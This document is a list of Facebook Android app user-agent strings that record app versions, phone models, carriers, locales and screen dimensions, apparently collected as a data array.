"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/210362028;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997198;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/205643271;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2051};FBLC/en_US;FBRV/210081654;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/210561420;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/210658448;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.0.0.7.121;FBBV/210375804;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027740;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/0;FBCR/Iliad;FBMF/Meizu;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/M6 Note;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629362;FBDM/{density=2.25,width=720,height=1372};FBLC/it_IT;FBRV/0;FBCR/PosteMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G930A;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653424;FBDM/{density=3.375,width=1080,height=1758};FBLC/en_US;FBRV/210964070;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281685;FBDM/{density=3.5,width=1440,height=2984};FBLC/en_US;FBRV/206069743;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629337;FBDM/{density=1.325,width=1280,height=736};FBLC/uk_UA;FBRV/210796532;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X304L;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027765;FBDM/{density=2.625,width=1080,height=2144};FBLC/en_US;FBRV/209644275;FBCR/AT&amp-T;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G820;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/207949327;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629348;FBDM/{density=4.5,width=1440,height=2560};FBLC/en_US;FBRV/210561420;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G890A;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=3.0,width=1080,height=2051};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851400;FBDM/{density=2.25,width=720,height=1280};FBLC/en_US;FBRV/201443087;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S367VL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/211347975;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.825,width=1440,height=2696};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H9436;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681576;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/204159830;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/211775167;FBCR/Xfinity Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851403;FBDM/{density=2.75,width=1080,height=2150};FBLC/en_GB;FBRV/0;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6 Pro;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653414;FBDM/{density=2.0,width=720,height=1402};FBLC/en_US;FBRV/211387411;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S102DL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653472;FBDM/{density=3.5,width=1440,height=2712};FBLC/en_US;FBRV/211985059;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.5,width=1440,height=2712};FBLC/en_US;FBRV/210430229;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/182.0.0.46.77;FBBV/118539372;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_US;FBRV/118725758;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/211323261;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2029};FBLC/en_US;FBRV/212198177;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629359;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/210731379;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S367VL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/242.0.0.43.119;FBBV/176515212;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBRV/0;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J337AZ;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/212345419;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2046};FBLC/en_US;FBRV/212444242;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/212508364;FBCR/Roaming;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=2.625,width=1080,height=2156};FBLC/en_US;FBRV/212605443;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/212417866;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/212646349;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1710-02;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/212675737;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681891;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/212675737;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G935V;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/211985059;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681919;FBDM/{density=2.0,width=720,height=1402};FBLC/en_US;FBRV/213106641;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A102U;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681962;FBDM/{density=4.5,width=1440,height=2646};FBLC/en_US;FBRV/212568638;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS988;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681886;FBDM/{density=3.0,width=1080,height=1920};FBLC/uk_UA;FBRV/213212609;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/213310081;FBCR/alfa;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8142;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=3.375,width=1080,height=1998};FBLC/en_US;FBRV/0;FBCR/cricket;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/213343617;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/211729529;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681872;FBDM/{density=1.5,width=1200,height=1848};FBLC/en_US;FBRV/213532798;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB3-X70F;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681962;FBDM/{density=3.5,width=1440,height=2712};FBLC/en_US;FBRV/213586356;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281663;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/207024646;FBCR/BudVdoma;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo A6010;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/213586356;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681886;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/213439635;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920T;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783057;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/213911328;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G930V;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/209644275;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212782869;FBDM/{density=2.0,width=1200,height=1831};FBLC/en_US;FBRV/213932784;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-V521;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783047;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/LAVA;FBBD/LAVA;FBPN/com.facebook.katana;FBDV/Z92;FBSV/8.1.0;FBOP/11;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027750;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/LAVA;FBBD/LAVA;FBPN/com.facebook.katana;FBDV/Z81;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783075;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/214205475;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/214437585;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281685;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/207024646;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518826;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/203119134;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.75,width=1080,height=2088};FBLC/en_US;FBRV/0;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3a;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125778;FBDM/{density=2.25,width=720,height=1332};FBLC/en_US;FBRV/214824289;FBCR/cricket;FBMF/Alcatel;FBBD/TCL;FBPN/com.facebook.katana;FBDV/Alcatel_5008R;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/214521896;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/214902642;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/214496621;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125759;FBDM/{density=1.0,width=768,height=1024};FBLC/en_US;FBRV/214902642;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T350;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/214646499;FBCR/Extended Network;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=2.625,width=2069,height=1080};FBLC/en_US;FBRV/214786616;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/214902642;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/214824289;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125784;FBDM/{density=3.375,width=1080,height=1998};FBLC/en_US;FBRV/214902642;FBCR/AT&amp-T;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q710.FGN;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125760;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/214902642;FBCR/Qlink;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/N9137;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294650;FBDM/{density=2.0,width=720,height=1344};FBLC/en_GB;FBRV/0;FBCR/MTN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636710;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Idea - Be Safe;FBMF/GIONEE;FBBD/GIONEE;FBPN/com.facebook.katana;FBDV/GIONEE F205 Pro;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895087;FBDM/{density=1.5,width=1920,height=1128};FBLC/nl_NL;FBRV/215683036;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A10-70F;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365690;FBDM/{density=3.0,width=1080,height=2208};FBLC/fr_FR;FBRV/216077496;FBCR/inwi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1989;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.5,width=1440,height=2792};FBLC/es_LA;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.75,width=720,height=1382};FBLC/fr_FR;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009794;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/TELCEL;FBMF/TCT;FBBD/TCT;FBPN/com.facebook.katana;FBDV/ALCATEL ONE TOUCH 7042A;FBSV/4.2.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681576;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365668;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629362;FBDM/{density=2.75,width=1080,height=2150};FBLC/en_GB;FBRV/0;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281674;FBDM/{density=2.25,width=720,height=1332};FBLC/en_GB;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783075;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
